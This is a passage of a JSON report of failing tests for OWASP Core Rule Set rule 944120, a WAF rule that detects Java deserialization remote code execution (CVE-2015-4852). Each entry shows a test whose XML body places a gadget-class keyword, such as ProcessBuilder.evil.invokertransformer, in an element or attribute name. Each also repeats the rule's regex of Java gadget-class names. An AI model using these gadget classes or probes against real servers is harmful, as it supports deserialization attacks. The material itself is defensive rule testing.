        "pattern" : "(?:clonetransformer|forclosure|instantiatefactory|instantiatetransformer|invokertransformer|prototypeclonefactory|prototypeserializationfactory|whileclosure|getproperty|filewriter|xmldecoder)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Java serialization (CVE-2015-4852)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "944120",
    "test_id" : 41,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944120.yaml",
    "description" : "XML attribute name includes keyword ProcessBuilder.evil.instantiatefactory",
    "cause" : "failed no_expect_ids check: 944120 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)" ]
    },
    "test" : {
      "test_id" : 41,
      "desc" : "XML attribute name includes keyword ProcessBuilder.evil.instantiatefactory",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "<?xml version=\"1.0\"?><xml><element ProcessBuilder.evil.instantiatefactory=\"attribute_value\">element_value</element></xml>"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 944120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944120,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Magic bytes detected and payload included possibly RCE vulnerable classes detected and process execution methods detected"
        }, {
          "type" : "Comment",
          "text" : " anomaly score set to critical as all conditions indicate the request try to perform RCE."
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BODY"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:clonetransformer|forclosure|instantiatefactory|instantiatetransformer|invokertransformer|prototypeclonefactory|prototypeserializationfactory|whileclosure|getproperty|filewriter|xmldecoder)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Java serialization (CVE-2015-4852)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "944120",
    "test_id" : 57,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944120.yaml",
    "description" : "XML element includes keyword ProcessBuilder.evil.instantiatetransformer",
    "cause" : "failed no_expect_ids check: 944120 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)" ]
    },
    "test" : {
      "test_id" : 57,
      "desc" : "XML element includes keyword ProcessBuilder.evil.instantiatetransformer",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "<?xml version=\"1.0\"?><xml><ProcessBuilder.evil.instantiatetransformer attribute_name=\"attribute_value\">value</ProcessBuilder.evil.instantiatetransformer></xml>"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 944120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944120,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Magic bytes detected and payload included possibly RCE vulnerable classes detected and process execution methods detected"
        }, {
          "type" : "Comment",
          "text" : " anomaly score set to critical as all conditions indicate the request try to perform RCE."
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BODY"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:clonetransformer|forclosure|instantiatefactory|instantiatetransformer|invokertransformer|prototypeclonefactory|prototypeserializationfactory|whileclosure|getproperty|filewriter|xmldecoder)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Java serialization (CVE-2015-4852)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "944120",
    "test_id" : 58,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944120.yaml",
    "description" : "XML attribute name includes keyword ProcessBuilder.evil.instantiatetransformer",
    "cause" : "failed no_expect_ids check: 944120 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)" ]
    },
    "test" : {
      "test_id" : 58,
      "desc" : "XML attribute name includes keyword ProcessBuilder.evil.instantiatetransformer",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "<?xml version=\"1.0\"?><xml><element ProcessBuilder.evil.instantiatetransformer=\"attribute_value\">element_value</element></xml>"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 944120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944120,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Magic bytes detected and payload included possibly RCE vulnerable classes detected and process execution methods detected"
        }, {
          "type" : "Comment",
          "text" : " anomaly score set to critical as all conditions indicate the request try to perform RCE."
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BODY"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:clonetransformer|forclosure|instantiatefactory|instantiatetransformer|invokertransformer|prototypeclonefactory|prototypeserializationfactory|whileclosure|getproperty|filewriter|xmldecoder)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Java serialization (CVE-2015-4852)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "944120",
    "test_id" : 74,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944120.yaml",
    "description" : "XML element includes keyword ProcessBuilder.evil.invokertransformer",
    "cause" : "failed no_expect_ids check: 944120 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)" ]
    },
    "test" : {
      "test_id" : 74,
      "desc" : "XML element includes keyword ProcessBuilder.evil.invokertransformer",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "<?xml version=\"1.0\"?><xml><ProcessBuilder.evil.invokertransformer attribute_name=\"attribute_value\">value</ProcessBuilder.evil.invokertransformer></xml>"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 944120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944120,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Magic bytes detected and payload included possibly RCE vulnerable classes detected and process execution methods detected"
        }, {
          "type" : "Comment",
          "text" : " anomaly score set to critical as all conditions indicate the request try to perform RCE."
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BODY"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:clonetransformer|forclosure|instantiatefactory|instantiatetransformer|invokertransformer|prototypeclonefactory|prototypeserializationfactory|whileclosure|getproperty|filewriter|xmldecoder)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Java serialization (CVE-2015-4852)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "944120",
    "test_id" : 75,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944120.yaml",
    "description" : "XML attribute name includes keyword ProcessBuilder.evil.invokertransformer",
    "cause" : "failed no_expect_ids check: 944120 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)" ]
    },
    "test" : {
      "test_id" : 75,
      "desc" : "XML attribute name includes keyword ProcessBuilder.evil.invokertransformer",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "<?xml version=\"1.0\"?><xml><element ProcessBuilder.evil.invokertransformer=\"attribute_value\">element_value</element></xml>"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 944120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944120,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Magic bytes detected and payload included possibly RCE vulnerable classes detected and process execution methods detected"
        }, {
          "type" : "Comment",
          "text" : " anomaly score set to critical as all conditions indicate the request try to perform RCE."
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BODY"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:clonetransformer|forclosure|instantiatefactory|instantiatetransformer|invokertransformer|prototypeclonefactory|prototypeserializationfactory|whileclosure|getproperty|filewriter|xmldecoder)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Java serialization (CVE-2015-4852)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "944120",
    "test_id" : 91,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944120.yaml",
    "description" : "XML element includes keyword ProcessBuilder.evil.prototypeclonefactory",
    "cause" : "failed no_expect_ids check: 944120 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)" ]
    },
